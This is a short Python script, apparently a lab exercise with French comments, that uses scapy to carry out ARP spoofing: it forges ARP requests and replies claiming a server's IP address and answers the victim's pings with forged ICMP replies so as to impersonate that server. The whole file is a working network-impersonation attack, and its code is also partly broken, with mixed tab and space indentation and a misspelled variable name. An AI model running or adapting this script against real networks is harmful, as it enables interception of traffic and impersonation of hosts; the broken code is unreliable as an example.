#! /usr/bin/python3

from scapy.all import *


myMAC = ""
victim = ""
server = ""
# envoi d'un ARP
packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc=server,pdst=victim)
answer = srp1(packet, timeout=1, verbose=False)

victimMAC = answer[ARP].hwsrc

packet2 =Ether(src=myMAC, dst=answer[ARP].hwsrc)/IP(src=server, dst=victim)/ICMP(type=8)/"data" 
answer2 = srp1(packet2, timeout=1, verbose=False)

if answer2:
	print("ahah :D ")
else:
	print("ohoh :/ ")


def test(anwser2):
	if answer2.haslayer(ARP) is True:
		if answer2[ARP].hwsrc == victimMAC and answer2[ARP].hwdst == myMAC and anwser2[ARP].psrc == victim and answer2[ARP].pdst == server and answer2[ARP].op == 1:
			print(".", flush=True)
 		packet4 = Ether(src=myMAC, dst=victimMAC)/ARP(hwlen=6, plen=4, op=2, hwsrc=myMAC, psrc=server, pdst=victim, hwdst=victimMAC)
 		answer4 = srp1(packet4, timeout=1, verbose=False)



	if answer2.haslayer(ICMP) is True:
		if answer2[IP].src == victim and answer2[IP].dst == server and answer2[IP].type == 8:
			print("I.", flush=True)
			packet3 = Ether(src=myMAC, dst=victimMAC)/IP(src=server, dst=victim)/ICMP(type=0)/"data"
			send(packet3, verbose=False)


print("[*] Usurpation:...")
bpf = "ether src " +  victimMAC
sniff(filter=bpf, prn=test)

